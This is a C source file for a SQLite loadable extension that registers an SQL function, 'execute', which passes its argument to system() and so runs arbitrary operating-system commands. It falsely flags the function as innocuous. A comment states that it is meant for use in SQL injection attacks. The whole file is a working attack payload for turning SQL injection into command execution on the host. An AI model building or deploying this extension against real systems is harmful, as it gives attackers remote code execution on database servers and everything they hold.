#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */
SQLITE_EXTENSION_INIT1

#include <stdlib.h>

#ifdef _WIN32
__declspec(dllexport)
#endif


static void systemExec(
  sqlite3_context *context,
  int argc,
  sqlite3_value **argv
){
   const unsigned char * cmd = sqlite3_value_text(argv[0]);
   int ret = system((const char *)cmd);
}

int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  SQLITE_EXTENSION_INIT2(pApi);

  int rc = sqlite3_create_function(db, "execute", 1, SQLITE_UTF8 | SQLITE_INNOCUOUS, 0, systemExec, 0, 0);

  // subsequent calls need to return OK since this will be used in injections and we can't really control how many times its going to be loaded
  return SQLITE_OK;
}
